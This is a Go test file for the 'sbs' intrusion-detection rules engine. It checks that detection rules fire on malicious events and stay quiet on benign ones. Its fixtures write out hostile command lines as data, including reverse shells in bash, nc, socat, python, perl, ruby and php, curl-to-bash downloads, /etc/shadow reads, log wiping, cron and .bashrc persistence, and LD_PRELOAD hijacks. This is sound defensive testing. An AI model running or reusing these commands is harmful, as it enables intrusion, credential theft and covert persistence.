package rules_test

import (
	"testing"

	"github.com/avaadrian/sbs/assets"
	"github.com/avaadrian/sbs/internal/event"
	"github.com/avaadrian/sbs/internal/rules"
)

func proc(name, cmdline string) *event.Event {
	return &event.Event{Type: event.TypeProcess, Process: &event.Process{Comm: name, Cmdline: cmdline, Exe: "/usr/bin/" + name}}
}

func ids(as []*event.Alert) map[string]bool {
	m := map[string]bool{}
	for _, a := range as {
		m[a.RuleID] = true
	}
	return m
}

func TestConditionTree(t *testing.T) {
	rs, err := rules.Parse([]byte(`
- id: T-1
  title: test
  event: process
  match:
    all:
      - field: process.name
        value: [sh, bash]
      - any:
          - field: process.cmdline
            op: contains
            value: EVIL
            nocase: true
          - field: process.cmdline
            op: regex
            value: '^x+$'
      - not:
          field: parent.name
          value: sshd
`), "test")
	if err != nil {
		t.Fatal(err)
	}
	eng, err := rules.NewEngine(rs)
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		ev   *event.Event
		want bool
	}{
		{proc("sh", "run evil now"), true},
		{proc("bash", "xxxx"), true},
		{proc("zsh", "evil"), false},
		{proc("sh", "benign"), false},
		{&event.Event{Type: event.TypeProcess, Process: &event.Process{Comm: "sh", Cmdline: "evil", ParentComm: "sshd"}}, false},
		{&event.Event{Type: event.TypeFile, File: &event.File{Path: "/evil"}}, false},
	}
	for _, c := range cases {
		if got := len(eng.Evaluate(c.ev)) > 0; got != c.want {
			t.Errorf("%+v: got %v want %v", c.ev.Process, got, c.want)
		}
	}
}

func TestParseErrors(t *testing.T) {
	bad := map[string]string{
		"no id":        "- title: x\n  event: process\n  match: {field: a, value: b}",
		"bad event":    "- id: a\n  title: x\n  event: net\n  match: {field: a, value: b}",
		"bad op":       "- id: a\n  title: x\n  event: process\n  match: {field: a, op: like, value: b}",
		"bad regex":    "- id: a\n  title: x\n  event: process\n  match: {field: a, op: regex, value: '('}",
		"two kinds":    "- id: a\n  title: x\n  event: process\n  match: {field: a, value: b, not: {field: c, value: d}}",
		"bad severity": "- id: a\n  title: x\n  severity: urgent\n  event: process\n  match: {field: a, value: b}",
	}
	for name, y := range bad {
		if _, err := rules.Parse([]byte(y), name); err == nil {
			t.Errorf("%s: expected error", name)
		}
	}
}

// TestDefaultRules checks the built-in rules against true and false positives.
func TestDefaultRules(t *testing.T) {
	rs, err := assets.Rules()
	if err != nil {
		t.Fatal(err)
	}
	eng, err := rules.NewEngine(rs)
	if err != nil {
		t.Fatal(err)
	}
	hits := []struct {
		rule string
		ev   *event.Event
	}{
		{"SBS-PROC-001", proc("sh", "sh -c curl -fsSL https://x.example/i.sh | sudo bash")},
		{"SBS-PROC-001", proc("sh", "sh -c wget -qO- http://1.2.3.4/a|sh")},
		{"SBS-PROC-002", proc("sh", "sh -c echo aGk= | base64 --decode | bash")},
		{"SBS-PROC-004", proc("bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")},
		{"SBS-PROC-004", proc("nc", "nc 10.0.0.1 4444 -e /bin/sh")},
		{"SBS-PROC-007", proc("cat", "cat /etc/shadow")},
		{"SBS-PROC-008", proc("bash", "bash -c history -c")},
		{"SBS-PROC-009", proc("chmod", "chmod 4755 /tmp/x")},
		{"SBS-PROC-009", proc("chmod", "chmod u+s /tmp/x")},
		{"SBS-PROC-010", proc("x", "./x -o stratum+tcp://pool:3333")},
		{"SBS-PROC-013", proc("sh", "sh -c rm -rf /var/log/auth.log")},
		{"SBS-PROC-003", &event.Event{Type: event.TypeProcess, Process: &event.Process{Comm: "bash", Stdin: "inet"}}},
		{"SBS-PROC-005", &event.Event{Type: event.TypeProcess, Process: &event.Process{Comm: "x", Exe: "/dev/shm/x"}}},
		{"SBS-PROC-006", &event.Event{Type: event.TypeProcess, Process: &event.Process{Comm: "x", Exe: "/memfd:x (deleted)"}}},
		{"SBS-FILE-002", &event.Event{Type: event.TypeFile, File: &event.File{Path: "/home/a/.ssh/authorized_keys", Op: "modify"}}},
		{"SBS-FILE-005", &event.Event{Type: event.TypeFile, File: &event.File{Path: "/tmp/x", Op: "chmod", Tag: "drop", Mode: "0755"}}},
		{"SBS-FILE-006", &event.Event{Type: event.TypeFile, File: &event.File{Path: "/tmp/x", Op: "chmod", Tag: "drop", Mode: "04755"}}},
	}
	for _, h := range hits {
		if !ids(eng.Evaluate(h.ev))[h.rule] {
			t.Errorf("%s did not fire on %+v %+v", h.rule, h.ev.Process, h.ev.File)
		}
	}
	quiet := []*event.Event{
		proc("curl", "curl -o file.tar.gz https://example.com/file.tar.gz"),
		proc("sh", "sh -c base64 file | base64 -d > out"),
		proc("passwd", "passwd /etc/shadow"),
		proc("chmod", "chmod 755 /usr/local/bin/tool"),
		proc("chmod", "chmod +x script.sh"),
		proc("bash", "bash -c cat ~/.bashrc"),
		{Type: event.TypeProcess, Process: &event.Process{Comm: "bash", Stdin: "socket"}}, // unix socket, e.g. sshd
		{Type: event.TypeProcess, Process: &event.Process{Comm: "test", Exe: "/tmp/go-build123/b001/x.test"}},
		{Type: event.TypeFile, File: &event.File{Path: "/tmp/notes.txt", Op: "modify", Tag: "drop", Mode: "0644"}},
		{Type: event.TypeFile, File: &event.File{Path: "/etc/cron.d/x", Op: "delete", Tag: "persistence"}},
	}
	for _, ev := range quiet {
		if as := eng.Evaluate(ev); len(as) > 0 {
			t.Errorf("false positive %s on %+v %+v", as[0].RuleID, ev.Process, ev.File)
		}
	}
}

func file(path, op string) *event.Event {
	return &event.Event{Type: event.TypeFile, File: &event.File{Path: path, Op: op}}
}

// TestCoverageGapRules exercises the rules added to close the held-out
// benchmark coverage gaps: interpreter-launched reverse shells, shebang scripts
// run from staging/home dirs, case-insensitive socat directives, process-level
// persistence (cron/systemd/at, systemctl enable, shell-rc edits) and
// LD_PRELOAD / ld.so.preload hijacks.
func TestCoverageGapRules(t *testing.T) {
	rs, err := assets.Rules()
	if err != nil {
		t.Fatal(err)
	}
	eng, err := rules.NewEngine(rs)
	if err != nil {
		t.Fatal(err)
	}
	hits := []struct {
		rule string
		ev   *event.Event
	}{
		// SBS-PROC-014: interpreter opens a socket and execs a shell.
		{"SBS-PROC-014", proc("python3", `python3 -c import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0);os.execv("/bin/sh",["/bin/sh","-i"])`)},
		{"SBS-PROC-014", proc("perl", `perl -e use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(4444,inet_aton("127.0.0.1")));exec("/bin/sh -i");`)},
		{"SBS-PROC-014", proc("ruby", `ruby -e require "socket";s=TCPSocket.new("127.0.0.1",4444);exec("/bin/sh -i")`)},
		{"SBS-PROC-014", proc("php", `php -r $s=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");`)},
		// SBS-PROC-015: shebang script / interpreter run from a staging or home dir.
		{"SBS-PROC-015", proc("sh", "/bin/sh /tmp/sbs-bench-x1/home/app/.update.sh")},
		{"SBS-PROC-015", proc("python3", "python3 /dev/shm/stage.py")},
		{"SBS-PROC-015", proc("bash", "bash /home/user/.config/.update.sh")},
		// A real shebang exec: comm is the script basename, exe is the interpreter.
		{"SBS-PROC-015", &event.Event{Type: event.TypeProcess, Process: &event.Process{
			Comm: ".update.sh", Exe: "/usr/bin/dash", Cmdline: "/bin/sh /tmp/stage/home/app/.update.sh"}}},
		// SBS-PROC-004: socat upper-case EXEC: directive (case-insensitive).
		{"SBS-PROC-004", proc("socat", "socat TCP:127.0.0.1:4444 EXEC:/bin/sh")},
		{"SBS-PROC-004", proc("socat", "socat tcp:10.0.0.1:9 SYSTEM:/bin/bash")},
		// SBS-PROC-016: scheduled task / transient unit persistence.
		{"SBS-PROC-016", proc("crontab", "crontab -u sbs-bench-nouser-xyz -")},
		{"SBS-PROC-016", proc("crontab", "crontab /tmp/payload")},
		{"SBS-PROC-016", proc("systemd-run", "systemd-run --scope --quiet sleep 0.3")},
		{"SBS-PROC-016", proc("at", "at now + 1 minute")},
		// SBS-PROC-017: service enabled via systemctl.
		{"SBS-PROC-017", proc("systemctl", "systemctl enable --now evil.service")},
		// SBS-PROC-018: shell startup / user-service persistence.
		{"SBS-PROC-018", proc("sh", "sh -c echo 'curl http://x/a|sh' >> /home/user/.bashrc")},
		{"SBS-PROC-018", proc("bash", "bash -c echo evil >> ~/.zshrc")},
		// SBS-PROC-019: LD_PRELOAD hijack via command line.
		{"SBS-PROC-019", proc("sh", "sh -c export LD_PRELOAD=/dev/shm/evil.so; /bin/ls")},
		{"SBS-PROC-019", proc("env", "env LD_PRELOAD=/tmp/x.so /usr/bin/id")},
		{"SBS-PROC-019", proc("sh", "sh -c echo /tmp/evil.so >> /etc/ld.so.preload")},
		// SBS-FILE-007: preload file written under any name.
		{"SBS-FILE-007", file("/etc/ld.so.preload.bak", "create")},
		{"SBS-FILE-007", file("/etc/ld.so.preload", "modify")},
	}
	for _, h := range hits {
		if !ids(eng.Evaluate(h.ev))[h.rule] {
			t.Errorf("%s did not fire on %+v %+v", h.rule, h.ev.Process, h.ev.File)
		}
	}

	quiet := []*event.Event{
		// Normal interpreter use: no socket+shell combination.
		proc("python3", "python3 app.py"),
		proc("perl", "perl -e print 1"),
		proc("python3", "python3 -c import socket; print(socket.gethostname())"),
		proc("node", "node server.js"),
		// Build/dev scripts: not under a writable staging dir, or excluded.
		proc("sh", "sh -c mkdir -p /tmp/sbs-bench-x1/drop/build && echo 'int main(){}' > /tmp/sbs-bench-x1/drop/build/main.c"),
		proc("bash", "bash /home/user/deploy.sh"),
		proc("sh", "sh /usr/local/bin/backup.sh"),
		proc("sh", "sh /tmp/go-build999/b001/exec.sh"),
		// Benign cron/at/systemctl usage.
		proc("crontab", "crontab -l"),
		proc("crontab", "crontab -e"),
		proc("at", "at -l"),
		proc("systemctl", "systemctl status sshd"),
		proc("systemctl", "systemctl restart nginx"),
		proc("systemctl", "systemctl daemon-reload"),
		// Reading an rc file, not writing it.
		proc("sh", "sh -c source ~/.bashrc"),
		// Legitimate system-library preload and a read of the preload file.
		proc("env", "env LD_PRELOAD=/usr/lib/libjemalloc.so /usr/bin/myapp"),
		proc("sh", "sh -c cat /etc/ld.so.preload"),
		// A non-preload linker config file.
		file("/etc/ld.so.conf", "modify"),
		file("/etc/ld.so.conf.d/local.conf", "create"),
	}
	for _, ev := range quiet {
		if as := eng.Evaluate(ev); len(as) > 0 {
			t.Errorf("false positive %s on %+v %+v", as[0].RuleID, ev.Process, ev.File)
		}
	}
}
